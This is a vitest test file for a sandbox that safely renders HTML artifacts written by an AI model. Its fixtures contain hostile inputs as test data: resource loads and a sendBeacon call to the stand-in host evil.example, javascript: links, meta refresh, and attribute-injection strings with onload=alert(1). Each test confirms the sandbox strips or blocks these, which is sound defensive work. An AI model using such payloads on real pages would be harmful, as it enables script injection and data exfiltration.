import { JSDOM, VirtualConsole } from 'jsdom';
import { describe, expect, it } from 'vitest';
import {
  ASSISTANT_HTML_ARTIFACT_GUIDE,
  ASSISTANT_HTML_GUIDE_MARKER,
  HTML_ARTIFACT_CSP,
  HTML_ARTIFACT_LIMITS,
  assessHtmlArtifact,
  clampArtifactHeight,
  htmlArtifactFileName,
  parseAssistantContent,
  readHtmlArtifactMessage,
  type HtmlArtifactAssessment,
} from './assistantHtml';

const ORIGIN = 'http://app.test';
const NONCE = 'abc123def456';
const build = (html: string): Extract<HtmlArtifactAssessment, { ok: true }> => {
  const result = assessHtmlArtifact(html, { nonce: NONCE, targetOrigin: ORIGIN });
  if (!result.ok) throw new Error(`expected ok, got ${result.reason}`);
  return result;
};

describe('parseAssistantContent', () => {
  it('splits markdown around a closed html fence and numbers artifacts', () => {
    const blocks = parseAssistantContent('Intro\n\n```html\n<p>one</p>\n```\n\nMiddle\n\n```HTML\n<b>two</b>\n```\nEnd');
    expect(blocks.map((block) => block.type)).toEqual(['markdown', 'html', 'markdown', 'html', 'markdown']);
    expect(blocks.filter((block) => block.type === 'html').map((block) => (block.type === 'html' ? block.artifactIndex : -1))).toEqual([0, 1]);
  });

  it('never treats an unterminated html fence as runnable', () => {
    const blocks = parseAssistantContent('Text\n```html\n<script>alert(1)</script>');
    expect(blocks.map((block) => block.type)).toEqual(['markdown', 'html-open']);
  });

  it('leaves other fences, and html mentioned inside them, as markdown', () => {
    const text = 'a\n````markdown\n```html\n<p>x</p>\n```\n````\n\n```js\nconst x = "<div>";\n```';
    const blocks = parseAssistantContent(text);
    expect(blocks).toHaveLength(1);
    expect(blocks[0].type).toBe('markdown');
  });

  it('keeps an html fence without any tag as ordinary markdown', () => {
    expect(parseAssistantContent('```html\njust words\n```').every((block) => block.type === 'markdown')).toBe(true);
  });

  it('supports tilde fences and ignores indented-code lookalikes', () => {
    expect(parseAssistantContent('~~~html\n<i>x</i>\n~~~').map((block) => block.type)).toEqual(['html']);
    expect(parseAssistantContent('    ```html\n    <i>x</i>\n    ```').every((block) => block.type === 'markdown')).toBe(true);
  });
});

describe('assessHtmlArtifact limits', () => {
  it('rejects oversize and empty sources without building a document', () => {
    const big = `<p>${'x'.repeat(HTML_ARTIFACT_LIMITS.maxSourceBytes)}</p>`;
    expect(assessHtmlArtifact(big, { nonce: NONCE, targetOrigin: ORIGIN })).toMatchObject({ ok: false, reason: 'too-large' });
    expect(assessHtmlArtifact('   ', { nonce: NONCE, targetOrigin: ORIGIN })).toMatchObject({ ok: false, reason: 'empty' });
  });

  it('counts bytes rather than characters', () => {
    const multibyte = `<p>${'é'.repeat(HTML_ARTIFACT_LIMITS.maxSourceBytes / 2)}</p>`;
    expect(assessHtmlArtifact(multibyte, { nonce: NONCE, targetOrigin: ORIGIN })).toMatchObject({ ok: false, reason: 'too-large' });
  });
});

describe('sandbox document', () => {
  it('puts the CSP meta before anything the model wrote', () => {
    const { document: doc } = build('<meta http-equiv="Content-Security-Policy" content="default-src *"><p id="m">hi</p>');
    expect(doc.startsWith('<!doctype html>')).toBe(true);
    const firstMeta = doc.indexOf('<meta');
    expect(doc.slice(firstMeta, firstMeta + 60)).toContain('http-equiv="Content-Security-Policy"');
    expect(doc.indexOf(HTML_ARTIFACT_CSP)).toBeLessThan(doc.indexOf('id="m"'));
    // The model's own CSP cannot appear: it is stripped, so nothing can loosen ours.
    expect(doc).not.toContain('default-src *');
  });

  it('denies every network, embedding and navigation directive', () => {
    const directives = new Map(
      HTML_ARTIFACT_CSP.split(';').map((part) => {
        const [name, ...values] = part.trim().split(/\s+/);
        return [name, values] as const;
      }),
    );
    expect(directives.get('default-src')).toEqual(["'none'"]);
    for (const name of ['connect-src', 'frame-src', 'child-src', 'worker-src', 'object-src', 'manifest-src', 'base-uri', 'form-action']) {
      expect(directives.get(name), name).toEqual(["'none'"]);
    }
    for (const [name, values] of directives) {
      for (const value of values) {
        expect(value, `${name} ${value}`).not.toMatch(/^(?:\*|https?:|wss?:|ftp:)/);
      }
    }
  });

  it('removes anything that could load, navigate or embed, but keeps inline interactivity', () => {
    const { document: doc, blocked, plainText } = build(`
      <meta http-equiv="refresh" content="0;url=https://evil.example/">
      <base href="https://evil.example/">
      <link rel="stylesheet" href="https://evil.example/a.css">
      <style>@import url("https://evil.example/b.css"); .k{background:url(https://evil.example/i.png)} .ok{color:red}</style>
      <script src="https://evil.example/x.js"></script>
      <iframe src="https://evil.example/"></iframe>
      <object data="https://evil.example/o"></object>
      <embed src="https://evil.example/e">
      <h1>Zones</h1>
      <a id="ext" href="https://evil.example/">out</a>
      <a id="js" href="javascript:alert(1)">js</a>
      <a id="frag" href="#zones">in page</a>
      <img id="remote" src="https://evil.example/p.png" srcset="https://evil.example/p2.png 2x">
      <img id="inline" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">
      <form id="f" action="https://evil.example/post"><input name="q"><button id="go" type="button" onclick="document.title='clicked'">go</button></form>
      <div style="background:url(https://evil.example/s.png);color:blue">styled</div>
      <script>window.interactive = 42;</script>
    `);
    expect(doc).not.toMatch(/evil\.example/);
    expect(doc).not.toMatch(/<(?:iframe|object|embed|base|link)\b/i);
    expect(doc).not.toMatch(/http-equiv="refresh"/i);
    expect(doc).not.toContain('javascript:');
    expect(doc).toContain('id="frag"');
    expect(doc).toContain('href="#zones"');
    expect(doc).toContain('data:image/gif;base64');
    expect(doc).toContain('window.interactive = 42');
    expect(doc).toContain("onclick=\"document.title='clicked'\"");
    expect(doc).toContain('.ok{color:red}');
    expect(doc).toContain('color:blue');
    expect(blocked.links).toBeGreaterThanOrEqual(2);
    expect(blocked.resources).toBeGreaterThanOrEqual(5);
    expect(blocked.embeds).toBe(3);
    expect(blocked.navigation).toBeGreaterThanOrEqual(2);
    expect(plainText).toContain('Zones');
    expect(plainText).not.toContain('interactive = 42');
  });

  it('escapes hostile text in the document language and body attributes', () => {
    const result = assessHtmlArtifact('<body class=\'a" onload="alert(1)\'><p>x</p></body>', {
      nonce: NONCE,
      targetOrigin: ORIGIN,
      lang: 'en" onload="alert(1)',
    });
    if (!result.ok) throw new Error('expected ok');
    expect(result.document).toContain('<html lang="en" dir="ltr">');
    expect(result.document).toContain('class="a&quot; onload=&quot;alert(1)"');
  });
});

describe('bootstrap script, executed in a scripted window', () => {
  const load = (html: string, beforeParse?: (window: Window & typeof globalThis) => void) => {
    const dom = new JSDOM(build(html).document, {
      runScripts: 'dangerously',
      url: `${ORIGIN}/`,
      pretendToBeVisual: true,
      // Scripts that throw on purpose would otherwise print to the test's stderr.
      virtualConsole: new VirtualConsole(),
      beforeParse(window) {
        (window as unknown as { Element: typeof Element }).Element.prototype.getBoundingClientRect = () => ({ height: 321 }) as DOMRect;
        beforeParse?.(window as unknown as Window & typeof globalThis);
      },
    });
    const messages: unknown[] = [];
    dom.window.addEventListener('message', (event) => messages.push((event as MessageEvent).data));
    return { dom, messages };
  };
  const settle = () => new Promise((resolve) => setTimeout(resolve, 20));

  it('runs the model\'s own script and reports a clamped, nonce-bound height', async () => {
    const { dom, messages } = load('<p id="out">before</p><script>document.getElementById("out").textContent = "after";</script>');
    await settle();
    expect(dom.window.document.getElementById('out')?.textContent).toBe('after');
    const sizes = messages.map((data) => readHtmlArtifactMessage(data, NONCE)).filter((message) => message?.type === 'size');
    expect(sizes[0]).toEqual({ type: 'size', height: 321 });
    expect(messages.map((data) => readHtmlArtifactMessage(data, 'some-other-nonce')).every((message) => message === undefined)).toBe(true);
  });

  it('neutralises WebRTC and beacons before the model script runs', () => {
    const { dom } = load('<script>window.__probe = { rtc: typeof RTCPeerConnection, beacon: navigator.sendBeacon("https://evil.example", "x") };</script>', (window) => {
      (window as unknown as Record<string, unknown>).RTCPeerConnection = function RTCPeerConnection() { /* real constructor stand-in */ };
    });
    expect((dom.window as unknown as { __probe: { rtc: string; beacon: boolean } }).__probe).toEqual({ rtc: 'undefined', beacon: false });
  });

  it('prevents link navigation and form submission, including elements the model creates later', () => {
    const { dom } = load('<a id="frag" href="#x">x</a><form id="f"><button id="s" type="submit">s</button></form>');
    const { document, MouseEvent, Event } = dom.window;
    const external = document.createElement('a');
    external.setAttribute('href', 'https://evil.example/');
    document.body.appendChild(external);
    const externalClick = new MouseEvent('click', { bubbles: true, cancelable: true });
    external.dispatchEvent(externalClick);
    expect(externalClick.defaultPrevented).toBe(true);

    const fragmentClick = new MouseEvent('click', { bubbles: true, cancelable: true });
    document.getElementById('frag')?.dispatchEvent(fragmentClick);
    expect(fragmentClick.defaultPrevented).toBe(false);

    const submit = new Event('submit', { bubbles: true, cancelable: true });
    document.getElementById('f')?.dispatchEvent(submit);
    expect(submit.defaultPrevented).toBe(true);
  });

  it('reports script errors without leaking beyond a short message', async () => {
    const { messages } = load('<script>throw new Error("' + 'boom'.repeat(100) + '");</script>');
    await settle();
    const error = messages.map((data) => readHtmlArtifactMessage(data, NONCE)).find((message) => message?.type === 'error');
    expect(error).toBeDefined();
    expect((error as { message: string }).message.length).toBeLessThanOrEqual(200);
  });
});

describe('frame messages and helpers', () => {
  it('accepts only well-formed, nonce-matching messages and clamps heights', () => {
    const base = { spcHtmlArtifact: 1, nonce: NONCE };
    expect(readHtmlArtifactMessage({ ...base, type: 'size', height: 5 }, NONCE)).toEqual({ type: 'size', height: HTML_ARTIFACT_LIMITS.minHeight });
    expect(readHtmlArtifactMessage({ ...base, type: 'size', height: 99999 }, NONCE)).toEqual({ type: 'size', height: HTML_ARTIFACT_LIMITS.maxHeight });
    expect(readHtmlArtifactMessage({ ...base, type: 'size', height: -4 }, NONCE)).toBeUndefined();
    expect(readHtmlArtifactMessage({ ...base, type: 'size', height: Number.NaN }, NONCE)).toBeUndefined();
    expect(readHtmlArtifactMessage({ ...base, type: 'size', height: '300' }, NONCE)).toBeUndefined();
    expect(readHtmlArtifactMessage({ ...base, nonce: 'wrong', type: 'size', height: 300 }, NONCE)).toBeUndefined();
    expect(readHtmlArtifactMessage({ spcHtmlArtifact: 2, nonce: NONCE, type: 'size', height: 300 }, NONCE)).toBeUndefined();
    expect(readHtmlArtifactMessage('size', NONCE)).toBeUndefined();
    expect(readHtmlArtifactMessage(null, NONCE)).toBeUndefined();
    expect(clampArtifactHeight(300.2)).toBe(301);
  });

  it('builds a safe download name', () => {
    expect(htmlArtifactFileName('Zones: 1σ/2σ <demo>\u0001')).toBe('Zones 1σ 2σ demo.html');
    expect(htmlArtifactFileName('***')).toBe('spc-interactive-view.html');
  });

  it('exposes an idempotency marker for the system-prompt guide', () => {
    expect(ASSISTANT_HTML_ARTIFACT_GUIDE).toContain(ASSISTANT_HTML_GUIDE_MARKER);
    expect(ASSISTANT_HTML_ARTIFACT_GUIDE).toMatch(/no external files/);
  });
});
